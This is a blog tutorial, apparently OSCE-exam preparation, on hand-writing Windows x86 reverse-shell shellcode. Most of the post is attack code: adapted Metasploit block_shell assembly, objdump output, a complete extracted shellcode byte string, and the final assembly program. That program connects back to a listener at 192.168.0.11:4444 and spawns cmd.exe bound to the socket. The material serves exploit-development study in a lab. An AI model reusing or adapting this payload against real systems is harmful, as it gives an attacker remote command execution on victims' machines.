---
layout: post
title: Windows x86 Manual Shellcode - Part 3
categories: [re,exploit]
tags: [osce]
fullview: false
comments: true
---
Continuation of [part 1](https://marcosvalle.github.io/re/exploit/2018/10/20/windows-manual-shellcode-part1.html) and [part 2](https://marcosvalle.github.io/re/exploit/2018/10/21/windows-manual-shellcode-part2.html) of the Windows x86 Manual Shellcode.

In this part we will continue this development by redirecting a shell to to the established connection.

## Call CreateProcessA
We already have the address of the `CreateProcessA` function we got with `arwin.exe`. Its kind of obvious what this function does, but lets check the [documentation](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa) just in case:

> Creates a new process and its primary thread. The new process runs in the security context of the calling process.

And the syntax:

~~~
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
~~~

This time, instead of trying to figure out each and every field of this structure, lets see if we can adapt [Metasploit's block_shell](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_shell.asm) code:

~~~
.shell:
	mov ebx, 0x646D6390    ; push our command line: 'cmd',0 padded with \x90
	shr ebx, 8
	push ebx
	mov ebx, esp           ; save a pointer to the command line
	push edi               ; our socket becomes the shells hStdError
	push edi               ; our socket becomes the shells hStdOutput
	push edi               ; our socket becomes the shells hStdInput
	xor esi, esi           ; Clear ESI for all the NULL's we need to push
	push byte 0x12         ; We want to place (18 * 4) = 72 null bytes onto the stack
	pop ecx                ; Set ECX for the loop

push_loop:
	push esi               ; push a null dword
	loop push_loop         ; keep looping untill we have pushed enough nulls
	mov word [esp + 0x3C], 0x0101 ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
	mov byte [esp + 0x10], 0x44
	lea eax, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure

  	;perform the call to CreateProcessA
	push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
	push eax               ; Push the pointer to the STARTUPINFO Structure
	push esi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
	push esi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
	push esi               ; We dont specify any dwCreationFlags 
	inc esi                ; Increment ESI to be one
	push esi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
	dec esi                ; Decrement ESI back down to zero
	push esi               ; Set lpThreadAttributes to NULL
	push esi               ; Set lpProcessAttributes to NULL
	push ebx               ; Set the lpCommandLine to point to "cmd",0
	push esi               ; Set lpApplicationName to NULL as we are using the command line param instead

	mov ebx, 0x7c80236b    ; CreateProcessA
	call ebx
~~~

A few modifications were necessary, of course. First, we must set the correct address of `CreateProcessA`. Also, since Metasploit uses [hashes instead of API calls](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm) to improve obfuscation, we had to change it too. I know, our shellcode is somewhat rudimentary, but it will be smaller I promise.

There is also the good and old issue of the NULL bytes, which Metasploit does not address directly. Lets assemble/link this piece of code and see if there are any NULLs we must solve:

~~~
$ objdump -d /tmp/shell.exe -M intel32

/tmp/shell.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	68 63 6d 64 00       	push   0x646d63
  401005:	89 e3                	mov    ebx,esp
  401007:	57                   	push   edi
  401008:	57                   	push   edi
  401009:	57                   	push   edi
  40100a:	31 f6                	xor    esi,esi
  40100c:	6a 12                	push   0x12
  40100e:	59                   	pop    ecx
  40100f:	56                   	push   esi
  401010:	e2 fd                	loop   40100f <.text+0xf>
  401012:	66 c7 44 24 3c 01 01 	mov    WORD PTR [esp+0x3c],0x101
  401019:	8d 44 24 10          	lea    eax,[esp+0x10]
  40101d:	c6 00 44             	mov    BYTE PTR [eax],0x44
  401020:	54                   	push   esp
  401021:	50                   	push   eax
  401022:	56                   	push   esi
  401023:	56                   	push   esi
  401024:	56                   	push   esi
  401025:	46                   	inc    esi
  401026:	56                   	push   esi
  401027:	4e                   	dec    esi
  401028:	56                   	push   esi
  401029:	56                   	push   esi
  40102a:	53                   	push   ebx
  40102b:	56                   	push   esi
  40102c:	68 79 cc 3f 86       	push   0x863fcc79
  401031:	ff d5                	call   ebp
  401033:	89 e0                	mov    eax,esp
  401035:	4e                   	dec    esi
  401036:	56                   	push   esi
  401037:	46                   	inc    esi
  401038:	ff 30                	push   DWORD PTR [eax]
  40103a:	68 08 87 1d 60       	push   0x601d8708
  40103f:	ff d5                	call   ebp
[...]
~~~

Notice that both `push 0x646d63` and `mov BYTE PTR [eax],0x44` add NULL bytes.

To solve the first issue, we transform `push 0x00646D63` into:

~~~
	mov ebx, 0x646D6390    ;push our command line: 'cmd',0 padded with \x90
	shr ebx, 8	       ;rotate right (ebx = 0x00646D63)
	push ebx
~~~

For the second one, we transform this snippet:

~~~
	lea eax, [esp + 0x10]    ; Set EAX as a pointer to our STARTUPINFO Structure
	mov byte [eax], 0x44     ; Set the size of the STARTUPINFO Structure
~~~

Into:

~~~
	mov byte [esp + 0x10], 0x44
	lea eax, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure
~~~

This works because we eliminate the `mov BYTE PTR [eax],0x44`, which was causing the problem.

Finally, lets extract the shellcode and see if it is NULL-free.

~~~
$ objdump -d Public/ctp/shellcode.exe|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x66\xb8\x33\x32\x50\x68\x77\x73\x32\x5f\x54\xbb\x7b\x1d\x80\x7c\xff\xd3\x89\xc5\x31\xc0\x66\xb8\x75\x70\x50\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x55\xbb\x40\xae\x80\x7c\xff\xd3\x31\xdb\x66\xbb\x90\x01\x29\xdc\x54\x31\xc9\x66\xb9\x02\x02\x51\xff\xd0\x31\xc0\x66\xb8\x74\x41\x50\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x55\xbb\x40\xae\x80\x7c\xff\xd3\x31\xdb\x53\x53\x53\x31\xc9\xb1\x06\x51\x43\x53\x43\x53\xff\xd0\x50\x5f\x31\xc0\xb8\x90\x65\x63\x74\xc1\xe8\x08\x50\x68\x63\x6f\x6e\x6e\x54\x55\xbb\x40\xae\x80\x7c\xff\xd3\xbb\xd1\xb9\x11\x1c\x81\xeb\x11\x11\x11\x11\x53\x66\x68\x11\x5c\x31\xdb\xb3\x02\x66\x53\x89\xe2\x6a\x10\x52\x57\xff\xd0\xbb\x90\x63\x6d\x64\xc1\xeb\x08\x53\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\xc6\x44\x24\x10\x44\x8d\x44\x24\x10\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\xbb\x6b\x23\x80\x7c\xff\xd3"
~~~

Awesome! To test it, we set a listener on port 4444 at our server and run it in the Windows VM.

![1-listener]({{ "/assets/media/manualshellcode/shellcode_listener.png" | absolute_url }})

However, there is still a small problem:

![2-crash]({{ "/assets/media/manualshellcode/shellcode_crash.png" | absolute_url }})

Since we did not correctly finish the process, it crashes. By now you should be fully confident about how to fix this issue, so I won't spoil it ;)

This is our final shellcode therefore:

~~~
global _start

section .text

_start:

.loadWinSock:
	xor eax, eax

	mov ax, 0x3233			;23
	push eax				;includes \0 at the end without insert NULLs
	push 0x5f327377 		;_2sw
	push esp			;pointer to the string

	mov ebx, 0x7c801d7b		;0x7b1d807c  	;addr of LoadLibraryA (0x7c801d7b)
	call ebx

	mov ebp, eax			;save winsock handle

.getWSAStartup:
	xor eax, eax

	mov ax, 0x7075      ; 'up'
	push eax
	push 0x74726174     ; 'trat'
	push 0x53415357     ; 'SASW'
	push esp	    ;pointer to the string

	push ebp	    ;winsock handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx

.callWSAStartUp:
	xor ebx, ebx
	mov bx, 0x0190
	sub esp, ebx
	push esp
	xor ecx, ecx
	mov cx, 0x0202
	push ecx

	call eax		; WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)


.getWSASocketA:
	xor eax, eax

	mov ax, 0x4174      ; 'At'
	push eax
	push 0x656b636f     ; 'ekco'
	push 0x53415357     ; 'SASW'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx

.callWSASocketA:
	xor ebx, ebx		;clear ebx
	push ebx;		;dwFlags=NULL
	push ebx;		;g=NULL
	push ebx;		;lpProtocolInfo=NULL
	
	xor ecx, ecx		;clear ecx
	mov cl, 0x6		;protocol=6
	push ecx

	inc ebx			;ebx==1
	push ebx		;type=1
	inc ebx			;af=2
	push ebx

	call eax		;call WSASocketA

	push eax		;save eax in edx
	pop edi			;...

.getConnect:
	xor eax, eax

	mov eax, 0x74636590     ;'\x90tce'
	shr eax, 8
	push eax
	push 0x6e6e6f63     ;'nnoc'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx

.callConnect:
	;set up sockaddr_in
	mov ebx, 0x1c11b9d1	;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.0.11)
	sub ebx, 0x11111111	;subtract from ebx to obtain the real IP
	push ebx		;push sin_addr
	push word 0x5c11	;0x115c = (port 4444)

	xor ebx, ebx
	mov bl, 2
	push bx	
	mov edx, esp

	push byte 0x10
	push edx
	push edi

	call eax

.shell:
	mov ebx, 0x646D6390    ; push our command line: 'cmd',0 padded with \x90
	shr ebx, 8
	push ebx
	mov ebx, esp           ; save a pointer to the command line
	push edi               ; our socket becomes the shells hStdError
	push edi               ; our socket becomes the shells hStdOutput
	push edi               ; our socket becomes the shells hStdInput
	xor esi, esi           ; Clear ESI for all the NULL's we need to push
	push byte 0x12         ; We want to place (18 * 4) = 72 null bytes onto the stack
	pop ecx                ; Set ECX for the loop

push_loop:
	push esi               ; push a null dword
	loop push_loop         ; keep looping untill we have pushed enough nulls
	mov word [esp + 0x3C], 0x0101 ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
	mov byte [esp + 0x10], 0x44
	lea eax, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure

  	;perform the call to CreateProcessA
	push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
	push eax               ; Push the pointer to the STARTUPINFO Structure
	push esi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
	push esi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
	push esi               ; We dont specify any dwCreationFlags 
	inc esi                ; Increment ESI to be one
	push esi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
	dec esi                ; Decrement ESI back down to zero
	push esi               ; Set lpThreadAttributes to NULL
	push esi               ; Set lpProcessAttributes to NULL
	push ebx               ; Set the lpCommandLine to point to "cmd",0
	push esi               ; Set lpApplicationName to NULL as we are using the command line param instead

	mov ebx, 0x7c80236b    ; CreateProcessA
	call ebx
~~~

![3-WIN]({{ "/assets/media/manualshellcode/shellcode_memewin.jpg" | absolute_url }})
